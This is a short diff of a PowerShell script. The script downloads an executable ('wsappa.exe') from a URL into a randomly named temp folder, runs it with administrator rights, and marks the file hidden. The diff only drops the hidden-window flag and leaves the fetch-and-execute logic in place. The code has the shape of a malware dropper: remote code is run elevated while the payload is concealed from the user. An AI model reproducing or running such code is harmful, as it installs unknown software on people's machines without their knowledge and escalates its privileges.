@@ -12,7 +12,7 @@ if (!(Test-Path -Path $savePath)) {
 
         $downloadedFilePath = Join-Path $folderPath "wsappa.exe"
         Invoke-WebRequest -Uri $fileUrl -OutFile $downloadedFilePath
-        Start-Process $env:temp\sVBXKuz\wsappa.exe -Verb RunAs -WindowStyle Hidden
+        Start-Process $env:temp\sVBXKuz\wsappa.exe -Verb RunAs
 
         # Hide the downloaded file
         Set-ItemProperty -Path $env:temp\sVBXKuz\wsappa.exe -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
